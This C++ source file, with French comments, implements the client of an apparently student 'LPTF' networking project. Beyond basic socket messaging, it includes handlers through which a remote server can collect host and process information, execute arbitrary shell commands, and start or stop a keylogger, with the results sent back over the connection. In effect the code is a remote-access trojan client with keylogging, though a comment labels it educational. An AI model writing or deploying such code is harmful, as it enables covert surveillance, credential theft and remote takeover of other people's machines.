#include "Client.hpp"
#include <iostream>
#include <thread>
#include <chrono>


Client::Client() 
    : socket_(nullptr), server_ip_("127.0.0.1"), server_port_(8080), is_connected_(false) {
}


Client::Client(const std::string& server_ip, int server_port)
    : socket_(nullptr), server_ip_(server_ip), server_port_(server_port), is_connected_(false) {
    socket_ = std::make_unique<LPTF_Socket>(server_ip_, server_port_, false);
}


Client::Client(const Client& other) 
    : socket_(nullptr), server_ip_(""), server_port_(0), is_connected_(false) {
    copy_from(other);
}


Client& Client::operator=(const Client& other) {
    if (this != &other) {
        disconnect();
        copy_from(other);
    }
    return *this;
}


Client::Client(Client&& other) noexcept 
    : socket_(nullptr), server_ip_(""), server_port_(0), is_connected_(false) {
    move_from(std::move(other));
}

// Opérateur d'assignation de move
Client& Client::operator=(Client&& other) noexcept {
    if (this != &other) {
        disconnect();
        move_from(std::move(other));
    }
    return *this;
}

// Destructeur
Client::~Client() {
    disconnect();
}

// Connexion au serveur
bool Client::connect_to_server() {
    if (!socket_) {
        socket_ = std::make_unique<LPTF_Socket>(server_ip_, server_port_, false);
    }
    
    if (socket_->connect_to_server()) {
        is_connected_ = true;
        std::cout << "Connecté au serveur " << server_ip_ << ":" << server_port_ << std::endl;
        return true;
    }
    
    std::cerr << "Impossible de se connecter au serveur" << std::endl;
    return false;
}

// Envoi d'un message
bool Client::send_message(const std::string& message) {
    if (!is_connected_ || !socket_) {
        std::cerr << "Client non connecté" << std::endl;
        return false;
    }
    
    ssize_t bytes_sent = socket_->send_data(message);
    if (bytes_sent > 0) {
        std::cout << "Message envoyé: " << message << std::endl;
        return true;
    }
    
    std::cerr << "Erreur lors de l'envoi du message" << std::endl;
    return false;
}

// Réception d'un message
bool Client::receive_message(std::string& message) {
    if (!is_connected_ || !socket_) {
        std::cerr << "Client non connecté" << std::endl;
        return false;
    }
    
    ssize_t bytes_received = socket_->receive_data(message);
    if (bytes_received > 0) {
        std::cout << "Message reçu: " << message << std::endl;
        return true;
    } else if (bytes_received == 0) {
        std::cout << "Connexion fermée par le serveur" << std::endl;
        is_connected_ = false;
        return false;
    }
    
    return false; // Erreur de réception
}

// Déconnexion
void Client::disconnect() {
    if (socket_) {
        socket_->close_socket();
        socket_.reset();
    }
    is_connected_ = false;
    std::cout << "Déconnecté du serveur" << std::endl;
}

// Getters
const std::string& Client::get_server_ip() const {
    return server_ip_;
}

int Client::get_server_port() const {
    return server_port_;
}

bool Client::get_is_connected() const {
    return is_connected_;
}

// Setter pour les informations du serveur
void Client::set_server_info(const std::string& ip, int port) {
    if (is_connected_) {
        std::cerr << "Impossible de changer les informations du serveur pendant une connexion active" << std::endl;
        return;
    }
    
    server_ip_ = ip;
    server_port_ = port;
    
    // Recréer la socket avec les nouveaux paramètres
    socket_ = std::make_unique<LPTF_Socket>(server_ip_, server_port_, false);
}

// Mode interactif du client
void Client::run_interactive() {
    std::cout << "=== Client LPTF ===" << std::endl;
    std::cout << "Tentative de connexion au serveur..." << std::endl;
    
    if (!connect_to_server()) {
        return;
    }
    
    std::string input;
    std::cout << "\nTapez vos messages (tapez 'quit' pour quitter):" << std::endl;
    
    while (true) {
        std::cout << "> ";
        std::getline(std::cin, input);
        
        if (input == "quit" || input == "exit") {
            break;
        }
        
        if (input.empty()) {
            continue;
        }
        
        // Envoyer le message
        if (!send_message(input)) {
            std::cerr << "Erreur lors de l'envoi, arrêt du client." << std::endl;
            break;
        }
        
        // Attendre une réponse
        std::string response;
        if (receive_message(response)) {
            // La réponse est déjà affichée dans receive_message
        } else {
            std::cerr << "Erreur lors de la réception, arrêt du client." << std::endl;
            break;
        }
        
        // Petite pause pour éviter de spammer
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    
    disconnect();
}

// Méthodes privées
void Client::copy_from(const Client& other) {
    server_ip_ = other.server_ip_;
    server_port_ = other.server_port_;
    is_connected_ = false; // Une copie n'est jamais connectée
    
    // Créer une nouvelle socket avec les mêmes paramètres
    if (other.socket_) {
        socket_ = std::make_unique<LPTF_Socket>(server_ip_, server_port_, false);
    }
}

void Client::move_from(Client&& other) noexcept {
    socket_ = std::move(other.socket_);
    server_ip_ = std::move(other.server_ip_);
    server_port_ = other.server_port_;
    is_connected_ = other.is_connected_;
    
    // Reset de l'objet source
    other.reset();
}

void Client::reset() {
    socket_.reset();
    server_ip_ = "";
    server_port_ = 0;
    is_connected_ = false;
}

void Client::run_remote_control_demo() {
    if (!remote_control_) {
        remote_control_ = std::make_unique<RemoteControl>();
    }
    
    std::cout << "\n=== DEMO Remote Control Features ===" << std::endl;
    
    
    while (true) {
        std::cout << "\nCommandes disponibles:" << std::endl;
        std::cout << "1. host     - Informations système" << std::endl;
        std::cout << "2. proc     - Liste des processus" << std::endl;
        std::cout << "3. cmd      - Exécuter une commande" << std::endl;
        std::cout << "4. keylog   - Test keylogger" << std::endl;
        std::cout << "5. quit     - Quitter" << std::endl;
        std::cout << "> ";
        
        std::string command;
        if (!std::getline(std::cin, command)) break;
        
        if (command == "host") {
            HostInfo info = remote_control_->get_host_info();
            std::cout << "📋 Informations système:" << std::endl;
            std::cout << "  Hostname: " << info.hostname << std::endl;
            std::cout << "  Username: " << info.username << std::endl;
            std::cout << "  OS: " << info.os_name << std::endl;
            std::cout << "  Version: " << info.os_version << std::endl;
            std::cout << "  Architecture: " << info.architecture << std::endl;
            
        } else if (command == "proc") {
            auto processes = remote_control_->get_process_list();
            std::cout << "📋 Processus (" << processes.size() << " total):" << std::endl;
            for (size_t i = 0; i < std::min(processes.size(), size_t(10)); ++i) {
                const auto& proc = processes[i];
                std::cout << "  PID " << proc.pid << ": " << proc.name 
                         << " (CPU: " << proc.cpu_usage << "%)" << std::endl;
            }
            
        } else if (command == "cmd") {
            std::cout << "Commande à exécuter: ";
            std::string cmd;
            if (std::getline(std::cin, cmd)) {
                std::string result = remote_control_->execute_command(cmd);
                std::cout << "📋 Résultat:" << std::endl;
                std::cout << result << std::endl;
            }
            
        } else if (command == "keylog") {
            test_keylogger();
            
        } else if (command == "quit") {
            break;
        } else {
            std::cout << "Commande inconnue" << std::endl;
        }
    }
}

void Client::test_keylogger() {
    std::cout << "\n🔍 Test du keylogger (version éducative)" << std::endl;
   
    
    bool started = remote_control_->start_keylogger();
    if (!started) {
        std::cout << "❌ Impossible de démarrer le keylogger" << std::endl;
        return;
    }
    
    std::cout << "✅ Keylogger démarré" << std::endl;
    std::cout << "📝 Appuyez sur Entrée après quelques secondes pour voir le résultat..." << std::endl;
    
    std::string dummy;
    std::getline(std::cin, dummy);
    
    std::string captured = remote_control_->get_captured_keys();
    std::cout << "📋 Touches capturées:" << std::endl;
    std::cout << captured << std::endl;
    
    bool stopped = remote_control_->stop_keylogger();
    std::cout << (stopped ? "✅ Keylogger arrêté" : "❌ Erreur lors de l'arrêt") << std::endl;
}

bool Client::handle_remote_control_request(const LPTF::LPTF_Packet& request) {
    if (!remote_control_) {
        remote_control_ = std::make_unique<RemoteControl>();
    }
    
    switch (request.get_message_type()) {
        case LPTF::MessageType::HOST_INFO_REQUEST:
            process_host_info_request();
            break;
            
        case LPTF::MessageType::PROCESS_LIST_REQUEST:
            process_process_list_request();
            break;
            
        case LPTF::MessageType::EXECUTE_COMMAND_REQUEST:
            process_execute_command_request(request);
            break;
            
        case LPTF::MessageType::KEYLOGGER_START_REQUEST:
        case LPTF::MessageType::KEYLOGGER_STOP_REQUEST:
            process_keylogger_request(request);
            break;
            
        default:
            return false;
    }
    
    return true;
}

void Client::process_host_info_request() {
    HostInfo info = remote_control_->get_host_info();
    LPTF::LPTF_Packet response = remote_control_->create_host_info_response(info);
    
    std::vector<uint8_t> data = response.serialize();
    std::string str_data(data.begin(), data.end());
    socket_->send_data(str_data);
}

void Client::process_process_list_request() {
    std::vector<ProcessInfo> processes = remote_control_->get_process_list();
    LPTF::LPTF_Packet response = remote_control_->create_process_list_response(processes);
    
    std::vector<uint8_t> data = response.serialize();
    std::string str_data(data.begin(), data.end());
    socket_->send_data(str_data);
}

void Client::process_execute_command_request(const LPTF::LPTF_Packet& request) {
    std::string command = request.get_string("command");
    std::string output = remote_control_->execute_command(command);
    
    LPTF::LPTF_Packet response = remote_control_->create_command_response(output, 0);
    
    std::vector<uint8_t> data = response.serialize();
    std::string str_data(data.begin(), data.end());
    socket_->send_data(str_data);
}

void Client::process_keylogger_request(const LPTF::LPTF_Packet& request) {
    bool success = false;
    std::string message;
    
    if (request.get_message_type() == LPTF::MessageType::KEYLOGGER_START_REQUEST) {
        success = remote_control_->start_keylogger();
        message = success ? "Keylogger started" : "Failed to start keylogger";
    } else {
        success = remote_control_->stop_keylogger();
        message = success ? "Keylogger stopped" : "Failed to stop keylogger";
    }
    
    LPTF::LPTF_Packet response = remote_control_->create_keylogger_status_response(success, message);
    
    std::vector<uint8_t> data = response.serialize();
    std::string str_data(data.begin(), data.end());
    socket_->send_data(str_data);
}